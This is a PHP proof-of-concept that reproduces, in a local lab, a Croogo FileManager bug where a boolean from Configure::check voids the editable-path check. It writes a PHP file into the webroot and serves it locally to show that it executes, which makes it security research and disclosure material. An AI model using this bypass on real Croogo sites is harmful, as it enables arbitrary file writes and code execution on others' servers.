<?php
/**
 * Logic-level local reproduction of the Croogo FileManager arbitrary write bug.
 *
 * The real source bug is:
 *   $editablePaths = (array)Configure::check('FileManager.editablePaths');
 * instead of:
 *   $editablePaths = (array)Configure::read('FileManager.editablePaths');
 *
 * Configure::check() returns a boolean. When the key exists, (array)true is
 * [true]. realpath(true) normally resolves as realpath('1'), which is false
 * in this lab. preg_quote(false) becomes an empty pattern, so /^/ matches
 * every path. The configured WWW_ROOT/assets boundary is therefore not
 * enforced by this check.
 */

final class Configure
{
    private static array $config = [];

    public static function write(string $key, mixed $value): void
    {
        self::$config[$key] = $value;
    }

    public static function check(string $key): bool
    {
        return array_key_exists($key, self::$config);
    }

    public static function read(string $key): mixed
    {
        return self::$config[$key] ?? null;
    }
}

final class VulnerableFileManager
{
    public function isEditable(string $path): bool
    {
        $editablePaths = (array)Configure::check('FileManager.editablePaths');
        foreach ($editablePaths as $editablePath) {
            if ($this->_isWithinPath($editablePath, $path)) {
                return true;
            }
        }
        return false;
    }

    protected function _isWithinPath(mixed $referencePath, string $pathToCheck): bool
    {
        $path = realpath($pathToCheck);
        $regex = '/^' . preg_quote((string)realpath($referencePath), '/') . '/';
        return preg_match($regex, (string)$path) > 0;
    }
}

$labRoot = '/tmp/croogo-filemanager-lab';
$webroot = $labRoot . '/webroot';
$assets = $webroot . '/assets';
$outsideEditableRoot = $webroot . '/';
$proofName = 'croogo_poc.php';
$proofPath = $outsideEditableRoot . $proofName;
$proofContent = '<?php echo "CROOGO_FILE_WRITE_POC"; ?>';

@system('rm -rf ' . escapeshellarg($labRoot));
mkdir($assets, 0777, true);

Configure::write('FileManager.editablePaths', [$assets]);

$expectedRoot = realpath($assets);
$targetDir = realpath($outsideEditableRoot);

echo "[*] Intended editable root: {$expectedRoot}\n";
echo "[*] Attacker-controlled create-file path: {$targetDir}/\n";

if (str_starts_with($targetDir, $expectedRoot)) {
    fwrite(STDERR, "[!] Lab setup error: target directory unexpectedly resides under assets.\n");
    exit(1);
}

echo "[*] Secure behavior would reject this path because it is outside assets.\n";

$fm = new VulnerableFileManager();
if (!$fm->isEditable($outsideEditableRoot)) {
    fwrite(STDERR, "[!] Vulnerable isEditable() did not allow the outside path in this PHP runtime.\n");
    exit(1);
}

echo "[+] Vulnerable isEditable() accepted the outside path.\n";

if (file_put_contents($proofPath, $proofContent) === false) {
    fwrite(STDERR, "[!] Failed to write proof file: {$proofPath}\n");
    exit(1);
}

echo "[+] Arbitrary file write reproduced: {$proofPath}\n";

echo "[*] Starting PHP built-in server to verify web-accessible PHP execution in the local lab...\n";
$cmd = 'php -S 127.0.0.1:8000 -t ' . escapeshellarg($webroot) . ' >/tmp/croogo-poc-server.log 2>&1 & echo $!';
$pid = (int)shell_exec($cmd);
if ($pid <= 0) {
    fwrite(STDERR, "[!] Could not start PHP built-in server.\n");
    exit(1);
}

register_shutdown_function(static function () use ($pid): void {
    if ($pid > 0) {
        @exec('kill ' . (int)$pid . ' >/dev/null 2>&1');
    }
});

$ready = false;
for ($i = 0; $i < 30; $i++) {
    $out = @file_get_contents('http://127.0.0.1:8000/' . $proofName);
    if ($out !== false) {
        $ready = true;
        break;
    }
    usleep(100000);
}

if (!$ready) {
    fwrite(STDERR, "[!] PHP built-in server did not become ready. Log follows:\n");
    fwrite(STDERR, @file_get_contents('/tmp/croogo-poc-server.log') ?: '');
    exit(1);
}

$output = @file_get_contents('http://127.0.0.1:8000/' . $proofName);

echo "[*] HTTP GET /{$proofName} output: {$output}\n";

if ($output !== 'CROOGO_FILE_WRITE_POC') {
    fwrite(STDERR, "[!] Unexpected proof output.\n");
    exit(1);
}

echo "[+] PHP proof file executed successfully in the local webroot.\n";
echo "[+] Vulnerability reproduced in local lab: configured assets-only boundary was bypassed and a file was written to webroot.\n";
